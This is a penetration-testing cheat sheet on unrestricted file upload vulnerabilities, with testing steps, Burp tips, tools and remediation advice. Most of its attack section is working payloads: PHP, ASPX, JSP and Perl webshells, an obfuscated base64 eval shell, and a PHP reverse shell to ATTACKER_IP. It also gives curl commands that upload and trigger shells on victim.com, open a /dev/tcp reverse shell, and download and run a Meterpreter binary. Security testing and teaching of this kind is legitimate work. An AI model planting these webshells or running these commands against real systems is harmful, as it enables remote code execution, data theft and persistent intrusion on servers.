# Unrestricted File Upload (Webshell)

## Overview
Unrestricted file upload occurs when a web application allows users to upload files without adequately restricting the type, content, or name of the uploaded file. When the server executes files stored in the upload directory (e.g., a PHP, ASPX, or JSP file uploaded to a web-accessible directory), an attacker can upload a webshell — a script that executes arbitrary OS commands on the server. This is one of the most critical web vulnerabilities, commonly leading directly to Remote Code Execution (RCE) and full server compromise.

## How It Works
The attacker uploads a file containing server-side code (PHP, ASPX, JSP, etc.). If the server stores it in a web-accessible location and the web server is configured to execute files of that type (e.g., Apache executes `.php` files), the attacker can trigger execution by browsing to the uploaded file's URL. The webshell then executes OS commands and returns output to the browser, giving the attacker an interactive command interface on the server with the privileges of the web server process.

## Impact
- Remote Code Execution (RCE) on the server
- Full server compromise — read/write to filesystem, execute binaries
- Access to databases, credentials, configuration files, and source code
- Lateral movement within internal network from the compromised server
- Establishing persistent access (reverse shell, SSH key injection, cron jobs)
- Data exfiltration of all application data
- Pivoting to other internal services accessible from the server
- Potential cloud instance metadata access leading to cloud account takeover

## Where to Look
- Profile avatar / photo upload
- Document or attachment upload (resumes, invoices, contracts)
- Plugin or theme upload in CMS (WordPress, Joomla, Drupal admin)
- Import functionality (CSV/XML/ZIP import that stores files)
- Any endpoint accepting `multipart/form-data` requests
- File manager or media library interfaces
- Package/module upload in administration panels

## Testing Steps
1. Identify all file upload functionality in the application.
2. Upload a legitimate allowed file (e.g., `.jpg`) and note the URL where it is stored.
3. Determine the web server technology (PHP, ASP.NET, Java, Python) from response headers, URLs, error pages.
4. Upload a minimal webshell with the expected extension first — does the server execute it?
5. If not, attempt extension bypasses (see the `upload_type_bypass.md` file for comprehensive bypass techniques).
6. After successful upload, browse to the file URL and append a command parameter: `?cmd=id`.
7. Observe if command output is returned in the response.
8. Upgrade to a full interactive shell if possible.
9. Test if the application strips code before storing — try obfuscated payloads.

## Payloads / Techniques

### PHP Webshells

**Minimal PHP one-liner:**
```php
<?php system($_GET['cmd']); ?>
```

**More capable PHP webshell:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    die;
}
?>
```

**PHP webshell with command output capture:**
```php
<?php
$output = shell_exec($_GET['cmd'] . ' 2>&1');
echo "<pre>$output</pre>";
?>
```

**PHP reverse shell trigger:**
```php
<?php
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

**PHP passthru webshell (bypasses some disable_functions):**
```php
<?php passthru($_GET['cmd']); ?>
```

**PHP eval-based (obfuscated):**
```php
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
```

**PHPinfo (useful to confirm execution before full shell):**
```php
<?php phpinfo(); ?>
```

### ASPX Webshells

**Classic ASPX webshell:**
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<html>
<body>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + cmd;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    string output = p.StandardOutput.ReadToEnd();
    Response.Write("<pre>" + output + "</pre>");
  }
%>
</body>
</html>
```

**Simple ASPX code execution:**
```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

### JSP Webshells

**JSP webshell:**
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    String[] commands = new String[]{"/bin/bash", "-c", cmd};
    Process p = Runtime.getRuntime().exec(commands);
    InputStream in = p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
    String line;
    out.println("<pre>");
    while ((line = reader.readLine()) != null) {
      out.println(line);
    }
    out.println("</pre>");
  }
%>
```

### Perl/CGI Webshell

```perl
#!/usr/bin/perl
use CGI;
my $q = new CGI;
print $q->header();
my $cmd = $q->param('cmd');
print `$cmd` if $cmd;
```

### Uploading and Triggering

**cURL upload of PHP webshell:**
```bash
# Upload as image:
curl -F "file=@shell.php;type=image/jpeg" \
     -H "Cookie: session=abc123" \
     https://victim.com/upload

# After upload, trigger execution:
curl "https://victim.com/uploads/shell.php?cmd=id"
curl "https://victim.com/uploads/shell.php?cmd=cat+/etc/passwd"
curl "https://victim.com/uploads/shell.php?cmd=ls+-la+/"
```

**Trigger reverse shell via webshell:**
```bash
# On attacker machine:
nc -lvnp 4444

# Via webshell (URL-encoded):
curl "https://victim.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

**Upgrade to Meterpreter after initial RCE:**
```bash
# Generate payload:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=5555 -f elf > shell.elf

# Via webshell:
curl "https://victim.com/uploads/shell.php?cmd=wget+http://ATTACKER_IP/shell.elf+-O+/tmp/s+&&+chmod+777+/tmp/s+&&+/tmp/s"
```

## Burp Suite Tips
- Intercept the legitimate file upload request in **Burp Proxy** and use **"Send to Repeater"** to modify and replay with the webshell payload.
- In Repeater, change both the `filename` parameter in the `Content-Disposition` header AND the `Content-Type` header to match the webshell.
- Use **Burp Intruder** with the **Upload Scanner** extension to systematically test bypass combinations.
- After uploading, use Burp's **HTTP history** to identify the exact URL path where uploaded files are served.
- Try submitting the webshell with the image's magic bytes prepended (using Burp Repeater to modify binary content) to bypass magic byte checks.
- Use the **"Render"** tab in Repeater to view if the server returns any execution output.

## Tools
- Burp Suite Pro (Upload Scanner extension)
- Upload Scanner — https://github.com/modzero/mod0BurpUploadScanner
- Weevely — https://github.com/epinna/weevely3 (PHP webshell generator with obfuscation)
- Metasploit Framework (reverse shell payloads and handlers)
- msfvenom (payload generation)
- netcat (reverse shell listener)
- SecLists webshells collection — https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
- p0wny-shell — https://github.com/flozz/p0wny-shell
- b374k — https://github.com/b374k/b374k

## Remediation
- **Allowlist file extensions**: Only permit specific, necessary extensions. Reject everything else. Never use a blocklist (too easy to bypass with double extensions, case, etc.).
- **Validate file content (magic bytes)**: Use a library to inspect the actual file signature (magic bytes), not just the extension or Content-Type header.
- **Rename uploaded files**: Generate a random UUID filename on the server side. Do not use the user-supplied filename.
- **Store outside the web root**: Save uploaded files in a directory that is not served by the web server. Serve them through an application controller that reads and streams the file.
- **Execute-deny for upload directories**: Configure the web server (Apache `.htaccess`, Nginx `location` block) to refuse script execution in the upload directory: `php_flag engine off`.
- **Separate domain**: Serve user uploads from a different domain with no execution capability.
- **Virus/malware scanning**: Scan uploaded files with a server-side antivirus or malware scanner.
- **Content-Disposition: attachment**: Always serve uploaded files with `Content-Disposition: attachment` so they download rather than render.
- **Principle of least privilege**: The web server process should not have permission to execute files in upload directories.

## References
https://portswigger.net/web-security/file-upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
